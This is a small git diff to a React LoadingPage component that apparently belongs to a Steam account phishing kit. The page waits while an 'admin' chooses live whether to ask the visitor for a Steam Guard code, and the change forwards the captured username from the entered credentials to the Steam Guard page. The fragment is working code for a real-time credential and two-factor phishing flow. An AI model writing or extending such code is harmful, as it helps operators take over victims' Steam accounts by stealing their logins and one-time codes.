@@ -27,7 +27,7 @@ const LoadingPage = () => {
           } else if (data.action === 'steam-guard') {
             // Admin clicked "Ask for Steam Guard"
             clearInterval(checkAdminActions);
-            navigate('/steam-guard');
+            navigate('/steam-guard', { state: { username: credentials.username } });
           }
         })
         .catch(err => {
